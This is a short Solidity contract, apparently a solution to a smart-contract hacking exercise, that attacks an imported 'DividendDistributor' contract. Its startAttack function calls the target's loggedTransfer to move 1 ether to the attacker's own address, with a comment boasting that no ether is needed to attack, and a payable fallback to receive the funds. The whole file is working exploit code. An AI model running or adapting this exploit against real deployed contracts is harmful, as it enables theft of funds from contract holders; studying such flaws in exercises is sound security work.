pragma solidity ^0.4.0;

import "5.sol";

// I need no ether to attack

contract GiveMeEverything {
    DividendDistributor public dd;
    uint64 public theif_counter;
    
    constructor() payable {
        
    }
    
    function startAttack(address _addr) public {
        dd = DividendDistributor(_addr);
                
        theif_counter++;
        
        //dd.loggedTransfer.value(1 ether)(1 ether, "Zoro!", address(this), address(this));
        dd.loggedTransfer(1 ether, "Zoro!", address(this), address(this));
        
    }
    
    function() public payable {
        
        
    }
    
}